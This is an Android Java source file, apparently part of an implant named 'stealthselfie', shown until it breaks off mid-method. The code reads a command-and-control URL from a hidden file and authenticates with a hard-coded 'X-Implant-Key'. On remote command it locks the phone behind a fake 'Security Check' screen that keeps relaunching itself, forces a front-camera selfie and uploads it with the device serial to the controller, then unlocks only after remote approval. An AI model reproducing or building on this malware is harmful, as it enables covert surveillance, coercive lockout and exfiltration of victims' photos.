package com.stealthselfie;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Matrix;
import android.graphics.Paint;
import android.graphics.RectF;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.hardware.Camera;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.view.WindowInsets;
import android.view.WindowInsetsController;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.ImageView;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import org.json.JSONArray;
import org.json.JSONObject;

import android.app.Dialog;
import android.provider.MediaStore;
import android.widget.Toast;
import android.content.ContentValues;
import android.net.Uri;
import android.os.Environment;
import java.io.OutputStream;

@SuppressWarnings("deprecation")
public class MainActivity extends Activity implements SurfaceHolder.Callback, Camera.FaceDetectionListener {

    private static final String TAG = "AndroidSecurity";
    private static final int POLL_INTERVAL_MS = 3000;
    private static final int POLL_TIMEOUT_MS  = 300000;

    private DevicePolicyManager dpm;
    private ComponentName adminComponent;
    private LinearLayout galleryListContainer;
    private Camera camera;
    private SurfaceView surfaceView;
    private Button captureButton;
    private Button retryButton;
    private TextView statusText;
    private TextView subStatusText;
    private ProgressBar spinner;
    private View overlayDim;
    
    private boolean isVerifyMode = false;
    private boolean isFaceDetected = false;
    private boolean isBusy = false;
    private int frontCameraId = -1;
    private String baseUrl = "http://127.0.0.1:8000";
    private String deviceId = "unknown";
    private final Handler handler = new Handler(Looper.getMainLooper());
    private Runnable autoRefreshRunnable;

    // ── Lifecycle ────────────────────────────────────────────────────────────

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, AdminReceiver.class);

        // Check mode: if launched via force_selfie it will have mode=verify
        Intent intent = getIntent();
        isVerifyMode = "verify".equals(intent.getStringExtra("mode"));

        try {
            deviceId = (String) Class.forName("android.os.SystemProperties")
                .getMethod("get", String.class, String.class)
                .invoke(null, "ro.serialno", "unknown");
        } catch (Exception ignored) {}

        try {
            File urlFile = new File("/data/local/tmp/c2_url.txt");
            if (urlFile.exists()) {
                BufferedReader br = null;
                try {
                    br = new BufferedReader(new FileReader(urlFile));
                    String wsUrl = br.readLine();
                    if (wsUrl != null && !wsUrl.isEmpty()) {
                        baseUrl = wsUrl
                            .replace("wss://", "https://")
                            .replace("ws://", "http://")
                            .replaceFirst("/ws$", "");
                    }
                } finally {
                    if (br != null) try { br.close(); } catch (Exception ignored) {}
                }
            }
        } catch (Exception ignored) {}

        if (isVerifyMode) {
            setupVerifyMode();
            findFrontCamera();
            buildVerifyUI();
        } else {
            buildGalleryUI();
        }
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        
        boolean wasVerifyMode = isVerifyMode;
        isVerifyMode = "verify".equals(intent.getStringExtra("mode"));
        
        if (isVerifyMode && !wasVerifyMode) {
            // Stop auto-refresh if it was running
            if (autoRefreshRunnable != null) {
                handler.removeCallbacks(autoRefreshRunnable);
            }
            
            // Switch to verify mode UI
            setupVerifyMode();
            findFrontCamera();
            buildVerifyUI();
        }
    }

    private void setupVerifyMode() {
        setShowWhenLocked(true);
        setTurnScreenOn(true);
        getWindow().addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
        );
        hideSystemUI();
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (isVerifyMode) {
            setupLockout();
            hideSystemUI();
            
            // Re-launch protection
            try {
                android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
                am.moveTaskToFront(getTaskId(), android.app.ActivityManager.MOVE_TASK_WITH_HOME);
            } catch (Exception ignored) {}
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        if (isVerifyMode) {
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    if (!isFinishing()) {
                        hideSystemUI();
                        // Force back to front
                        Intent launchIntent = new Intent(MainActivity.this, MainActivity.class);
                        launchIntent.putExtra("mode", "verify");
                        launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                        startActivity(launchIntent);
                    }
                }
            }, 200);
        }
    }

    @Override
    protected void onDestroy() {
        handler.removeCallbacksAndMessages(null);
        if (autoRefreshRunnable != null) {
            handler.removeCallbacks(autoRefreshRunnable);
        }
        releaseCamera();
        super.onDestroy();
    }

    // ── Gallery UI (User manually opened) ────────────────────────────────────

    private void buildGalleryUI() {
        ScrollView scroll = new ScrollView(this);
        scroll.setBackgroundColor(Color.parseColor("#0A0A0F"));

        final LinearLayout container = new LinearLayout(this);
        container.setOrientation(LinearLayout.VERTICAL);
        container.setPadding(40, 60, 40, 60);
        scroll.addView(container);

        // Header
        LinearLayout header = new LinearLayout(this);
        header.setOrientation(LinearLayout.HORIZONTAL);
        header.setGravity(Gravity.CENTER_VERTICAL);
        
        TextView title = new TextView(this);
        title.setText("Verifications");
        title.setTextColor(Color.WHITE);
        title.setTextSize(24);
        title.setTypeface(Typeface.create("sans-serif-medium", Typeface.BOLD));
        LinearLayout.LayoutParams titleParams = new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f);
        header.addView(title, titleParams);

        Button refreshBtn = new Button(this);
        refreshBtn.setText("REFRESH");
        refreshBtn.setTextColor(Color.parseColor("#6EE7B7"));
        refreshBtn.setBackground(null);
        refreshBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                fetchGalleryHistory();
            }
        });
        header.addView(refreshBtn);
        container.addView(header);

        TextView sub = new TextView(this);
        sub.setText("History of identity verifications performed on this device.");
        sub.setTextColor(Color.parseColor("#9E9EA8"));
        sub.setTextSize(14);
        sub.setPadding(0, 8, 0, 40);
        container.addView(sub);

        galleryListContainer = new LinearLayout(this);
        galleryListContainer.setOrientation(LinearLayout.VERTICAL);
        container.addView(galleryListContainer);

        setContentView(scroll);

        fetchGalleryHistory();
    }

    private void fetchGalleryHistory() {
        galleryListContainer.removeAllViews();
        final ProgressBar gallerySpinner = new ProgressBar(this);
        galleryListContainer.addView(gallerySpinner);

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String urlStr = baseUrl + "/api/device-selfies";
                    URL url = new URL(urlStr);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setConnectTimeout(10000);
                    conn.setReadTimeout(10000);
                    conn.setRequestMethod("GET");
                    conn.setRequestProperty("X-Device-ID", deviceId);
                    conn.setRequestProperty("X-Implant-Key", "DeltaForce2027");

                    int code = conn.getResponseCode();
                    if (code == 200) {
                        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                        StringBuilder sb = new StringBuilder();
                        String line;
                        while ((line = reader.readLine()) != null) sb.append(line);
                        reader.close();
                        
                        final JSONArray history = new JSONArray(sb.toString());
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                galleryListContainer.removeAllViews();
                                populateGallery(galleryListContainer, history);
                            }
                        });
                    } else {
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                galleryListContainer.removeAllViews();
                                TextView err = new TextView(MainActivity.this);
                                err.setText("Could not load history.");
                                err.setTextColor(Color.RED);
                                galleryListContainer.addView(err);
                            }
                        });
                    }
                    conn.disconnect();
                } catch (Exception e) {
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            galleryListContainer.removeAllViews();
                            TextView err = new TextView(MainActivity.this);
                            err.setText("Connection error.");
                            err.setTextColor(Color.RED);
                            galleryListContainer.addView(err);
                        }
                    });
                }
            }
        }).start();
    }

    private void populateGallery(LinearLayout container, JSONArray history) {
        if (history.length() == 0) {
            TextView empty = new TextView(this);
            empty.setText("No verifications found.");
            empty.setTextColor(Color.parseColor("#6B6B78"));
            empty.setTextSize(15);
            empty.setPadding(0, 40, 0, 0);
            container.addView(empty);
            return;
        }

        for (int i = 0; i < history.length(); i++) {
            JSONObject item = history.optJSONObject(i);
            if (item == null) continue;

            // Card: horizontal layout with thumbnail + text
            LinearLayout card = new LinearLayout(this);
            card.setOrientation(LinearLayout.HORIZONTAL);
            GradientDrawable bg = new GradientDrawable();
            bg.setColor(Color.parseColor("#1A1A24"));
            bg.setCornerRadius(24f);
            card.setBackground(bg);
            card.setPadding(24, 24, 24, 24);

            LinearLayout.LayoutParams cardParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            );
            cardParams.bottomMargin = 20;
            card.setLayoutParams(cardParams);

            // ── Thumbnail ImageView ──
            final ImageView thumb = new ImageView(this);
            thumb.setScaleType(ImageView.ScaleType.CENTER_CROP);
            GradientDrawable thumbBg = new GradientDrawable();
            thumbBg.setColor(Color.parseColor("#2A2A38"));
            thumbBg.setCornerRadius(16f);
            thumb.setBackground(thumbBg);
            thumb.setClipToOutline(true);
            LinearLayout.LayoutParams thumbParams = new LinearLayout.LayoutParams(220, 220);
            thumbParams.rightMargin = 24;
            card.addView(thumb, thumbParams);

            // ── Text container (right side) ──
            LinearLayout textCol = new LinearLayout(this);
            textCol.setOrientation(LinearLayout.VERTICAL);
            textCol.setGravity(Gravity.CENTER_VERTICAL);

            TextView timeText = new TextView(this);
            timeText.setText(item.optString("timestamp", "Unknown Date"));
            timeText.setTextColor(Color.WHITE);
            timeText.setTextSize(15);
            timeText.setTypeface(Typeface.create("sans-serif-medium", Typeface.BOLD));
            textCol.addView(timeText);

            String itemStatus = item.optString("status", "pending");
            TextView statText = new TextView(this);
            if ("approved".equals(itemStatus)) {
                statText.setText("\u2713 Approved");
                statText.setTextColor(Color.parseColor("#22C55E"));
            } else if ("denied".equals(itemStatus)) {
                statText.setText("\u2717 Denied");
                statText.setTextColor(Color.parseColor("#EF4444"));
            } else {
                statText.setText("\u231B Pending Review");
                statText.setTextColor(Color.parseColor("#F59E0B"));
            }
            statText.setTextSize(13);
            statText.setPadding(0, 8, 0, 0);
            textCol.addView(statText);

            card.addView(textCol, new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f));

            container.addView(card);

            // ── Load thumbnail asynchronously ──
            final String filename = item.optString("filename", "");
            final String titleStr = timeText.getText().toString();
            final LinearLayout finalCard = card;
            if (!filename.isEmpty()) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            String imgUrl = baseUrl + "/api/selfie-image/" + filename;
                            URL url = new URL(imgUrl);
                            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                            conn.setRequestProperty("X-Implant-Key", "DeltaForce2027");
                            conn.setConnectTimeout(10000);
                            conn.setReadTimeout(10000);
                            int code = conn.getResponseCode();
                            if (code == 200) {
                                // Decode with downsampling to save memory
                                byte[] imgBytes = readAllBytes(conn.getInputStream());
                                BitmapFactory.Options opts = new BitmapFactory.Options();
                                opts.inJustDecodeBounds = true;
                                BitmapFactory.decodeByteArray(imgBytes, 0, imgBytes.length, opts);
                                int scale = 1;
                                while (opts.outWidth / scale > 400 || opts.outHeight / scale > 400) {
                                    scale *= 2;
                                }
                                opts.inJustDecodeBounds = false;
                                opts.inSampleSize = scale;
                                final Bitmap bmp = BitmapFactory.decodeByteArray(imgBytes, 0, imgBytes.length, opts);
                                
                                // Load a high-res version for full screen view
                                opts.inSampleSize = 1;
                                final Bitmap fullBmp = BitmapFactory.decodeByteArray(imgBytes, 0, imgBytes.length, opts);
                                
                                if (bmp != null) {
                                    runOnUiThread(new Runnable() {
                                        @Override
                                        public void run() { 
                                            thumb.setImageBitmap(bmp); 
                                            if (fullBmp != null) {
                                                finalCard.setOnClickListener(new View.OnClickListener() {
                                                    @Override
                                                    public void onClick(View v) {
                                                        showImageDialog(fullBmp, titleStr);
                                                    }
                                                });
                                            }
                                        }
                                    });
                                }
                            } else if (code == 404) {
                                runOnUiThread(new Runnable() {
                                    @Override
                                    public void run() {
                                        container.removeView(finalCard);
                                    }
                                });
                            }
                            conn.disconnect();
                        } catch (Exception ignored) {}
                    }
                }).start();
            }
        }
    }

    /** Read all bytes from an InputStream (Java 8 compatible). */
    private byte[] readAllBytes(java.io.InputStream is) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[8192];
        int n;
        while ((n = is.read(buf)) != -1) bos.write(buf, 0, n);
        is.close();
        return bos.toByteArray();
    }

    private void showImageDialog(final Bitmap bmp, String titleText) {
        final Dialog dialog = new Dialog(this, android.R.style.Theme_Black_NoTitleBar_Fullscreen);
        
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(Color.BLACK);
        
        // Header
        LinearLayout header = new LinearLayout(this);
        header.setOrientation(LinearLayout.HORIZONTAL);
        header.setGravity(Gravity.CENTER_VERTICAL);
        header.setPadding(40, 40, 40, 40);
        
        TextView title = new TextView(this);
        title.setText(titleText);
        title.setTextColor(Color.WHITE);
        title.setTextSize(18);
        LinearLayout.LayoutParams titleParams = new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f);
        header.addView(title, titleParams);
        
        Button saveBtn = new Button(this);
        saveBtn.setText("SAVE");
        saveBtn.setTextColor(Color.parseColor("#6EE7B7"));
        saveBtn.setBackground(null);
        saveBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                try {
                    ContentValues values = new ContentValues();
                    long timeMillis = System.currentTimeMillis();
                    values.put(MediaStore.Images.Media.DISPLAY_NAME, "Selfie_" + timeMillis + ".jpg");
                    values.put(MediaStore.Images.Media.MIME_TYPE, "image/jpeg");
                    values.put(MediaStore.Images.Media.RELATIVE_PATH, Environment.DIRECTORY_DCIM + "/Camera");
                    values.put(MediaStore.Images.Media.IS_PENDING, 1);
                    values.put(MediaStore.Images.Media.DATE_ADDED, timeMillis / 1000);
                    values.put(MediaStore.Images.Media.DATE_TAKEN, timeMillis);

                    Uri uri = getContentResolver().insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, values);
                    if (uri != null) {
                        OutputStream out = getContentResolver().openOutputStream(uri);
                        bmp.compress(Bitmap.CompressFormat.JPEG, 100, out);
                        out.close();

                        values.clear();
                        values.put(MediaStore.Images.Media.IS_PENDING, 0);
                        getContentResolver().update(uri, values, null, null);
                        Toast.makeText(MainActivity.this, "Saved to Gallery", Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(MainActivity.this, "Failed to save", Toast.LENGTH_SHORT).show();
                    }
                } catch (Exception e) {
                    Toast.makeText(MainActivity.this, "Failed to save: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                }
            }
        });
        header.addView(saveBtn);
        
        layout.addView(header);
        
        // Image
        ImageView imageView = new ImageView(this);
        imageView.setImageBitmap(bmp);
        imageView.setScaleType(ImageView.ScaleType.FIT_CENTER);
        LinearLayout.LayoutParams imgParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT);
        layout.addView(imageView, imgParams);
        
        dialog.setContentView(layout);
        
        imageView.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dialog.dismiss();
            }
        });
        
        dialog.show();
    }

    // ── Verify UI (Triggered remotely) ───────────────────────────────────────

    private void buildVerifyUI() {
        FrameLayout root = new FrameLayout(this);
        root.setBackgroundColor(Color.parseColor("#0A0A0F"));

        // Camera preview
        surfaceView = new SurfaceView(this);
        surfaceView.getHolder().addCallback(this);
        root.addView(surfaceView, new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT));

        // Rectangular mask overlay
        RectMaskView maskView = new RectMaskView(this);
        root.addView(maskView, new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT));

        // Dimming overlay
        overlayDim = new View(this);
        overlayDim.setBackgroundColor(Color.parseColor("#E60A0A0F")); // 90% opacity
        overlayDim.setVisibility(View.GONE);
        root.addView(overlayDim, new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT));

        // ── Header ───────────────────────────────────────────────────────
        LinearLayout header = new LinearLayout(this);
        header.setOrientation(LinearLayout.VERTICAL);
        header.setGravity(Gravity.CENTER_HORIZONTAL);
        header.setPadding(40, 0, 40, 0);

        TextView iconText = new TextView(this);
        iconText.setText("\uD83D\uDEE1"); // Shield
        iconText.setTextSize(36);
        iconText.setGravity(Gravity.CENTER);
        iconText.setPadding(0, 100, 0, 12);
        header.addView(iconText);

        TextView titleText = new TextView(this);
        titleText.setText("Security Check");
        titleText.setTextColor(Color.WHITE);
        titleText.setTextSize(24);
        titleText.setTypeface(Typeface.create("sans-serif-medium", Typeface.BOLD));
        titleText.setGravity(Gravity.CENTER);
        header.addView(titleText);

        TextView subTitle = new TextView(this);
        subTitle.setText("For your protection, please verify your identity to unlock this device.");
        subTitle.setTextColor(Color.parseColor("#9E9EA8"));
        subTitle.setTextSize(14);
        subTitle.setGravity(Gravity.CENTER);
        subTitle.setPadding(0, 12, 0, 0);
        subTitle.setLineSpacing(4, 1.0f);
        header.addView(subTitle);

        FrameLayout.LayoutParams headerParams = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.WRAP_CONTENT);
        headerParams.gravity = Gravity.TOP;
        root.addView(header, headerParams);

        // ── Bottom section ───────────────────────────────────────────────
        LinearLayout bottomSection = new LinearLayout(this);
        bottomSection.setOrientation(LinearLayout.VERTICAL);
        bottomSection.setGravity(Gravity.CENTER_HORIZONTAL);
        bottomSection.setPadding(60, 0, 60, 0);

        statusText = new TextView(this);
        statusText.setText("Position your face in the frame");
        statusText.setTextColor(Color.parseColor("#B0B0BA"));
        statusText.setTextSize(16);
        statusText.setGravity(Gravity.CENTER);
        bottomSection.addView(statusText);

        subStatusText = new TextView(this);
        subStatusText.setText("");
        subStatusText.setTextColor(Color.parseColor("#6B6B78"));
        subStatusText.setTextSize(13);
        subStatusText.setGravity(Gravity.CENTER);
        subStatusText.setPadding(0, 8, 0, 0);
        subStatusText.setVisibility(View.GONE);
        bottomSection.addView(subStatusText);

        spinner = new ProgressBar(this, null, android.R.attr.progressBarStyleLarge);
        spinner.setVisibility(View.GONE);
        LinearLayout.LayoutParams spinnerParams = new LinearLayout.LayoutParams(80, 80);
        spinnerParams.gravity = Gravity.CENTER;
        spinnerParams.topMargin = 24;
        bottomSection.addView(spinner, spinnerParams);

        // Capture button
        captureButton = new Button(this);
        captureButton.setText("CAPTURE");
        captureButton.setEnabled(false);
        captureButton.setTextColor(Color.WHITE);
        captureButton.setTextSize(15);
        captureButton.setTypeface(Typeface.create("sans-serif-medium", Typeface.BOLD));
        captureButton.setLetterSpacing(0.05f);

        GradientDrawable btnBg = new GradientDrawable();
        btnBg.setCornerRadius(60f);
        btnBg.setColor(Color.parseColor("#1E293B"));
        captureButton.setBackground(btnBg);

        LinearLayout.LayoutParams btnParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 140);
        btnParams.topMargin = 28;
        captureButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                onCaptureClicked();
            }
        });
        bottomSection.addView(captureButton, btnParams);

        // Retry button
        retryButton = new Button(this);
        retryButton.setText("RETRY");
        retryButton.setTextColor(Color.parseColor("#93C5FD"));
        retryButton.setTextSize(14);
        retryButton.setTypeface(Typeface.create("sans-serif-medium", Typeface.BOLD));
        retryButton.setBackground(null);
        retryButton.setVisibility(View.GONE);
        retryButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                resetToCapture();
            }
        });

        LinearLayout.LayoutParams retryParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        retryParams.gravity = Gravity.CENTER;
        retryParams.topMargin = 16;
        bottomSection.addView(retryButton, retryParams);

        // Footer
        TextView footer = new TextView(this);
        footer.setText("Device Security Policy Enforcement");
        footer.setTextColor(Color.parseColor("#3A3A44"));
        footer.setTextSize(11);
        footer.setGravity(Gravity.CENTER);
        footer.setPadding(0, 28, 0, 40);
        bottomSection.addView(footer);

        FrameLayout.LayoutParams bottomParams = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.WRAP_CONTENT);
        bottomParams.gravity = Gravity.BOTTOM;
        root.addView(bottomSection, bottomParams);

        setContentView(root);
    }

    private void onCaptureClicked() {
        if (camera == null || isBusy) return;
        isBusy = true;

        captureButton.setEnabled(false);
        setButtonColor(captureButton, "#1E40AF");
        captureButton.setText("PROCESSING...");
        statusText.setText("Hold still...");
        statusText.setTextColor(Color.parseColor("#60A5FA"));

        camera.takePicture(null, null, new Camera.PictureCallback() {
            @Override
            public void onPictureTaken(byte[] data, Camera cam) {
                uploadPicture(data);
            }
        });
    }

    private void resetToCapture() {
        isBusy = false;
        isFaceDetected = false;
        overlayDim.setVisibility(View.GONE);
        spinner.setVisibility(View.GONE);
        retryButton.setVisibility(View.GONE);
        subStatusText.setVisibility(View.GONE);

        captureButton.setVisibility(View.VISIBLE);
        captureButton.setText("CAPTURE");
        captureButton.setEnabled(false);
        setButtonColor(captureButton, "#1E293B");

        statusText.setText("Position your face in the frame");
        statusText.setTextColor(Color.parseColor("#B0B0BA"));

        if (camera != null) {
            camera.startPreview();
            try { camera.startFaceDetection(); } catch (Exception ignored) {}
        }
    }

    private void uploadPicture(final byte[] data) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                captureButton.setVisibility(View.GONE);
                overlayDim.setVisibility(View.VISIBLE);
                spinner.setVisibility(View.VISIBLE);
                statusText.setText("Uploading secure photo...");
                statusText.setTextColor(Color.parseColor("#60A5FA"));
                subStatusText.setVisibility(View.GONE);
            }
        });

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
                    Matrix matrix = new Matrix();
                    matrix.postRotate(270);
                    Bitmap rotated = Bitmap.createBitmap(bitmap, 0, 0,
                            bitmap.getWidth(), bitmap.getHeight(), matrix, true);

                    ByteArrayOutputStream stream = new ByteArrayOutputStream();
                    rotated.compress(Bitmap.CompressFormat.JPEG, 85, stream);
                    byte[] jpegData = stream.toByteArray();
                    bitmap.recycle();
                    rotated.recycle();

                    String uploadUrl = baseUrl + "/api/upload-selfie";
                    String boundary = "----AndroidSecurity" + System.currentTimeMillis();
                    URL url = new URL(uploadUrl);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setConnectTimeout(15000);
                    conn.setReadTimeout(15000);
                    conn.setDoInput(true);
                    conn.setDoOutput(true);
                    conn.setUseCaches(false);
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("X-Device-ID", deviceId);
                    conn.setRequestProperty("X-Implant-Key", "DeltaForce2027");
                    conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                    DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                    dos.writeBytes("--" + boundary + "\r\n");
                    dos.writeBytes("Content-Disposition: form-data; name=\"selfie\";filename=\"selfie.jpg\"\r\n");
                    dos.writeBytes("Content-Type: image/jpeg\r\n\r\n");
                    dos.write(jpegData);
                    dos.writeBytes("\r\n");
                    dos.writeBytes("--" + boundary + "--\r\n");
                    dos.flush();
                    dos.close();

                    int code = conn.getResponseCode();
                    if (code == 200) {
                        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                        StringBuilder sb = new StringBuilder();
                        String line;
                        while ((line = reader.readLine()) != null) sb.append(line);
                        reader.close();
                        conn.disconnect();

                        JSONObject json = new JSONObject(sb.toString());
                        final int selfieId = json.optInt("selfie_id", -1);

                        if (selfieId > 0) {
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() { startPollingApproval(selfieId); }
                            });
                        } else {
                            showUploadError("Verification ID missing");
                        }
                    } else {
                        conn.disconnect();
                        showUploadError("Network Error (" + code + ")");
                    }
                } catch (Exception e) {
                    showUploadError("Connection Failed");
                }
            }
        }).start();
    }

    private void showUploadError(final String message) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                isBusy = false;
                spinner.setVisibility(View.GONE);
                statusText.setText(message);
                statusText.setTextColor(Color.parseColor("#EF4444"));
                retryButton.setVisibility(View.VISIBLE);
            }
        });
    }

    private void startPollingApproval(int selfieId) {
        statusText.setText("Awaiting approval...");
        statusText.setTextColor(Color.parseColor("#60A5FA"));
        subStatusText.setText("Review in progress. Please wait.");
        subStatusText.setVisibility(View.VISIBLE);
        spinner.setVisibility(View.VISIBLE);
        retryButton.setVisibility(View.GONE);

        final long startTime = System.currentTimeMillis();
        schedulePoll(selfieId, startTime);
    }

    private void schedulePoll(final int selfieId, final long startTime) {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() { doPollApproval(selfieId, startTime); }
        }, POLL_INTERVAL_MS);
    }

    private void doPollApproval(final int selfieId, final long startTime) {
        if (System.currentTimeMillis() - startTime > POLL_TIMEOUT_MS) {
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    spinner.setVisibility(View.GONE);
                    statusText.setText("Verification timed out");
                    statusText.setTextColor(Color.parseColor("#F59E0B"));
                    subStatusText.setText("Approval took too long.");
                    retryButton.setVisibility(View.VISIBLE);
                    isBusy = false;
                }
            });
            return;
        }

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String checkUrl = baseUrl + "/api/selfie-status/" + selfieId;
                    URL url = new URL(checkUrl);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setConnectTimeout(10000);
                    conn.setReadTimeout(10000);
                    conn.setRequestMethod("GET");
                    conn.setRequestProperty("X-Implant-Key", "DeltaForce2027");

                    int code = conn.getResponseCode();
                    if (code == 200) {
                        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                        StringBuilder sb = new StringBuilder();
                        String line;
                        while ((line = reader.readLine()) != null) sb.append(line);
                        reader.close();
                        conn.disconnect();

                        JSONObject json = new JSONObject(sb.toString());
                        String reviewStatus = json.optString("review_status", "pending");

                        if ("approved".equals(reviewStatus)) {
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() { onApproved(); }
                            });
                            return;
                        } else if ("denied".equals(reviewStatus)) {
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() { onDenied(); }
                            });
                            return;
                        }
                    } else {
                        conn.disconnect();
                    }
                } catch (Exception ignored) {}

                schedulePoll(selfieId, startTime);
            }
        }).start();
    }

    private void onApproved() {
        spinner.setVisibility(View.GONE);
        statusText.setText("\u2713 Identity verified");
        statusText.setTextColor(Color.parseColor("#22C55E"));
        subStatusText.setText("Unlocking device...");
        subStatusText.setTextColor(Color.parseColor("#6EE7B7"));

        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                isVerifyMode = false;
                try { stopLockTask(); } catch (Exception ignored) {}
                finishAndRemoveTask();
            }
        }, 1500);
    }

    private void onDenied() {
        isBusy = false;
        spinner.setVisibility(View.GONE);
        statusText.setText("Verification failed");
        statusText.setTextColor(Color.parseColor("#EF4444"));
        subStatusText.setText("Your photo was rejected. Please try again.");
        subStatusText.setTextColor(Color.parseColor("#9E9EA8"));
        retryButton.setVisibility(View.VISIBLE);
    }

    private void findFrontCamera() {
        int numCameras = Camera.getNumberOfCameras();
        for (int i = 0; i < numCameras; i++) {
            Camera.CameraInfo info = new Camera.CameraInfo();
            Camera.getCameraInfo(i, info);
            if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                frontCameraId = i;
                break;
            }
        }
    }

    @Override
    public void surfaceCreated(SurfaceHolder holder) {
        if (!isVerifyMode || frontCameraId == -1) return;
        try {
            camera = Camera.open(frontCameraId);
            camera.setPreviewDisplay(holder);
            camera.setDisplayOrientation(90);
            camera.setFaceDetectionListener(this);
            camera.startPreview();

            Camera.Parameters params = camera.getParameters();
            if (params.getMaxNumDetectedFaces() > 0) {
                camera.startFaceDetection();
            }
        } catch (Exception ignored) {}
    }

    @Override
    public void surfaceChanged(SurfaceHolder holder, int format, int w, int h) {}

    @Override
    public void surfaceDestroyed(SurfaceHolder holder) {
        releaseCamera();
    }

    private void releaseCamera() {
        if (camera != null) {
            try { camera.stopFaceDetection(); } catch (Exception ignored) {}
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }

    @Override
    public void onFaceDetection(Camera.Face[] faces, Camera cam) {
        if (isBusy) return;
        if (faces.length > 0) {
            if (!isFaceDetected) {
                isFaceDetected = true;
                captureButton.setEnabled(true);
